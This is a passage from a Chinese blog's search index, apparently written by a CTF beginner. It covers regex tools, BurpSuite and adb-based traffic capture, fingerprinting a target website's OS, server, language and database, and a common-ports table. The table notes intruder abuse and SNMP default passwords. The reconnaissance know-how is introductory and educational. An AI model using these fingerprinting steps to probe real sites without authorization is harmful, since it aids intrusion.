title="时间"></a>时间</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;^\[(\d+)\&#x2F;(\w+)\&#x2F;(\d+):(\d+):(\d+):(\d+)\s\+(\d+)\]$&#x2F;gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208204313878.png" alt="image-20210208204313878"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于正则表达式自己只学会了一些皮毛，不去练会儿过了一段时间很容易就忘掉了。</p><p>在一些ctf的题目中会遇见一些老长老长的正则让你去匹配，发现每次一点一点去写太浪费时间了，想一下应该会有一些脚本可以根据正则表达式反向生成相匹配的字符串，一查发现各种语言都有相应的库可以调用用来生成匹配的字符串如python的<a href="https://github.com/crdoconnor/xeger">xeger</a>和<a href="https://github.com/asciimoo/exrex">exrex</a>等，java也有<a href="https://github.com/bluezio/xeger">xeger</a>工具包可以用</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础</title>
      <link href="2020/webbasic/web-ji-chu/"/>
      <url>2020/webbasic/web-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="BurpSuite的使用"><a href="#BurpSuite的使用" class="headerlink" title="BurpSuite的使用"></a>BurpSuite的使用</h2><h3 id="抓网页的包"><a href="#抓网页的包" class="headerlink" title="抓网页的包"></a>抓网页的包</h3><p>1.配置端口和IP</p><p>2.导入证书(抓https)</p><p>3.浏览器开启BP的代理</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208193831482.png" alt="image-20210208193831482"></p><h3 id="抓APP和微信小程序的包"><a href="#抓APP和微信小程序的包" class="headerlink" title="抓APP和微信小程序的包"></a>抓APP和微信小程序的包</h3><p>抓APP的包和电脑差不多</p><p>发现现在新版的微信抓小程序的包会直接闪退</p><p>But,登上去的时候居然叫我更新?这不陷入死循环了吗😐</p><p>不过想一下,可以先登新版的微信然后给它卸了,留着它的登录数据,再下个老版的回来呀！</p><pre class="line-numbers language-none"><code class="language-none">adb shell pm unstall -k com.tencent.mmadb install -r -d  &#x2F;&#x2F;+apk路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用adb把这个删了,然后通过adb安装旧版微信</p><p>抓到欢乐斗地主小程序的包啦!</p><h2 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h2><h4 id="1-操作系统"><a href="#1-操作系统" class="headerlink" title="1.操作系统"></a>1.操作系统</h4><p>Windows,Linux,Mac那怎么判断一个网站运行在什么系统上呢?</p><p>一个小细节==windows大小写不敏感,而Linux大小写是敏感的==,所以可以通过修改url,看是否报错来判断系统,当然也可以通过抓包来看啦。</p><h4 id="2-搭建平台（服务器软件）"><a href="#2-搭建平台（服务器软件）" class="headerlink" title="2.搭建平台（服务器软件）"></a>2.搭建平台（服务器软件）</h4><p>有iis apache tomcat nginx等一些</p><h4 id="3-脚本语言"><a href="#3-脚本语言" class="headerlink" title="3.脚本语言"></a>3.脚本语言</h4><p>asp php jsp aspx等。。。。</p><p>那怎么看目标网站用的啥脚本语言呢？</p><p>首先一目了然的就是通过URL看啦，举个列子</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194256410.png" alt="image-20210208194256410"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194328666.png" alt="image-20210208194328666"></p><p>当然也可以通过抓包，爬虫，搜索引擎，还有一些专门的工具来查看</p><h4 id="4-数据库"><a href="#4-数据库" class="headerlink" title="4.数据库"></a>4.数据库</h4><p>常见的有mysql，Oracle，阿里云的polardb等一些国内公司自己搞的。。。。</p><p>要使用数据库就必须要给它开放一个端口</p><p>常见的mysql开放的端口一般是3306，Oracle是1521，sqlserver是1433。。。。</p><p>那怎么查看目标网站使用的数据库呢?</p><p>1.可以通过端口扫描，看它开放了什么端口</p><p>2.如果已经知道了目标网站使用的脚本语言就可以推断出它使用的数据库</p><p>一般为了兼容,通常有如下组合</p><p><strong>asp+access</strong></p><p><strong>php+mysql</strong></p><p><strong>aspx+mssql</strong></p><p><strong>jsp+mssql或oracle</strong></p><p>PS:==linux不存在asp aspx ,不存在iis==;</p><h4 id="5-CMS-内容管理系统"><a href="#5-CMS-内容管理系统" class="headerlink" title="5.CMS(内容管理系统)"></a>5.CMS(内容管理系统)</h4><p>cms就是内容管理系统，也可以理解成为网站建设系统。对于一些seo专员来说，内容管理系统可以帮助我们快速的建设任何类型的网站。cms系统的特点就是把网站模版和网站程序完全分开，同时还会提供模版方案，从而让网站的模版设计和程序彻底的分开，让网站设计人员可以对每个页面、栏目都使用不同的模版，随时都能进行编辑和修改。</p><p>内容管理系统使用基于角色的用户管理，通过添加不同权限的用户，可以把网站管理权限分配到不同的用户上，然后把这些用户通过权限来划分各种级别，例如：超级管理人员、栏目管理人员、文档录入人员、审核人员等等，这样网站在发布内容的时候就不会出现任何错误，同时也能保证内容的质量。  </p><h4 id="6-中间件"><a href="#6-中间件" class="headerlink" title="6.中间件"></a>6.中间件</h4><p>个人理解是介于系统和程序直接的一种东西，有了中间件可以简化开发流程，一些功能就不用全都用代码写出来，而是通过调用这个中间件就能够完成某些功能。举个例子，你去寄快递只要填收件人的地址和电话就ok了，快递由谁运，运到了哪儿你并不需要担心，只要快递送到了就好了，这时候快递公司就充当一个中间件的角色</p><h4 id="7-容器"><a href="#7-容器" class="headerlink" title="7.容器"></a>7.容器</h4><p>应用于将操作系统进行隔离的一种技术，避免一个应用的崩溃和影响其他应用的运行</p><p>容器和虚拟机的区别在与容器更加轻量，而虚拟机还需要一个操作系统再在这个系统之上安装应用</p><p>虚拟机一般适用于对不同的用户进行隔离，而容器一般适用于对不同的应用进行隔离</p><p>容器拿来就可以直接使用，不需要考虑环境之类的问题</p><h4 id="8-框架"><a href="#8-框架" class="headerlink" title="8.框架"></a>8.框架</h4><p>拿java来说，Java有三大框架，spring，struts，hibernate</p><p>框架就是一些类和接口的集合，相当与开发中的一个半成品，封装好直接拿来用就可以了 ，省的一遍又一遍敲着重复的代码</p><h2 id="常见的端口服务："><a href="#常见的端口服务：" class="headerlink" title="常见的端口服务："></a>常见的端口服务：</h2><p><strong>端口：20</strong></p><p>​    服务：FTP（文件传输协议）</p><p>​    说明：FTP数据端口</p><p><strong>端口：21</strong></p><p>​    服务：FTP</p><p>​    说明：FTP服务器所开放的端口，用于上传、下载。</p><p>​    最常见故障：用于攻击者寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口</p><p><strong>端口：22</strong></p><p>​    服务：SSh（安全外壳协议）</p><p>​    说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p><strong>端口：23</strong></p><p>​    服务：Telnet（远程终端协议）</p><p>​    说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。</p><p><strong>端口：25</strong></p><p>​    服务：SMTP（简单邮件传输协议）</p><p>​     说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM（垃圾邮件）。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。</p><p><strong>端口：53</strong></p><p>​    服务：DNS（域名系统）</p><p>​    说明：UDP端口，DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p><p><strong>端口：67</strong></p><p>​    服务：DHCP（动态主机配置协议）</p><p>​    说明：UDP端口，67端口发放IP</p><p><strong>端口 :  68</strong></p><p>​    服务：DHCP（动态主机配置协议）</p><p>​    说明：UDP端口，68端口发送成功和失败回应</p><p><strong>端口：69</strong></p><p>​    服务：TFTP（简单文件传输协议）</p><p>​    说明：是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的1文件传输服务</p><p><strong>端口：80</strong></p><p>​    服务：HTTP（超文本传输协议）</p><p>​    说明：明文传输。用于网页浏览，互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准 。木马Executor开放此端口。</p><p><strong>端口：110</strong></p><p>​    服务：pop3（邮局协议版本3）</p><p>​    说明：是TCP/IP协议族中的一员，主要用于支持使用客户端远程管理在服务器上的电子邮件。</p><p><strong>端口：123</strong></p><p>​    服务：NTP（网络时间协议）</p><p>​    说明：用来使网络中的各个计算机时间同步的一种协议。它的用途是把计算机的时钟同步到<strong>世界协调时</strong>UTC，其精度在局域网内可达0.1ms，在互联网上绝大多数的地方其精度可以达到1-50ms。它可以使计算机对其服务器或时钟源（如石英钟，GPS等等）进行时间同步，它可以提供高精准度的时间校正，而且可以使用加密确认的方式来防止病毒的协议攻击。</p><p><strong>端口：161</strong></p><p>​    服务：SNMP（简单网络管理协议）</p><p>​     说明：SNMP允许远程管理设备。所有配置和运行信息都储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p><strong>端口：389</strong></p><p>​    服务：LDAP（轻量级目录访问协议）、ILS（定位服务）</p><p>​    说明：LDAP是一种可让任何人找到网络中的组织，个人档案或装置等其他资源的一种软件协议不论是公共因特网或企业内网络。LDAP   服务和ILS服务共用389端口。</p><p><strong>端口：443</strong></p><p>​    服务：Https（超文本传输安全协议）</p><p>​    说明：加密传输。网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。 是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层（安全套接层），HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。</p><p><strong>端口：636</strong></p><p>​    服务：LDAPS</p><p>​    说明：通过安全套接字层的轻型目录访问协议 。</p><p><strong>端口：873</strong></p><p>​    服务：rsync</p><p>​    说明：文件传输服务</p><p><strong>端口：1521</strong></p><p>​    服务：Oracle</p><p><strong>端口：3306</strong></p><p>​    服务：MySQL</p><p>​    说明：SQL连接端口，提供客户端连接服务端 。</p><p><strong>端口：9000</strong></p><p>​    服务：php-fpm</p><p>​    说明：PHP以daemon模式运行</p><h2 id="正向代理，反向代理，端口转发"><a href="#正向代理，反向代理，端口转发" class="headerlink" title="正向代理，反向代理，端口转发"></a>正向代理，反向代理，端口转发</h2><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>代理服务器代理客户端去和目标服务器交互，目标服务器并不知道真正发送请求的客户端是哪个</p><p>类似于你找中介买房，然后中介再去和房东交涉</p><p>通过正向代理可以实现访问连不上的网站😁，也可以设置代理服务器提高访问速度，最最最重要的是可以<strong>隐藏客户端的真实IP</strong></p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>和正向代理相反，代理服务器接受internet上的请求，然后将其转发给内网服务器，然后将请求结果返回给Internet上请求连接的客户端</p><p>反向代理和正向代理相反，它可以<strong>隐藏服务器的真实IP</strong>，反向代理服务器也可以作为应用层的防火墙来保证网站的安全。</p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>端口转发就是将一个端口，这个端口可以本机的端口也可以是本机可以访问到的任意主机的端口，转发到任意一台可以访问到的IP上，通常这个IP是公网IP</p><p>适用端口转发的网络环境有以下几种：</p><ol><li><p>服务器处于内网，可以访问外部网络。</p></li><li><p>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p></li><li><p>服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
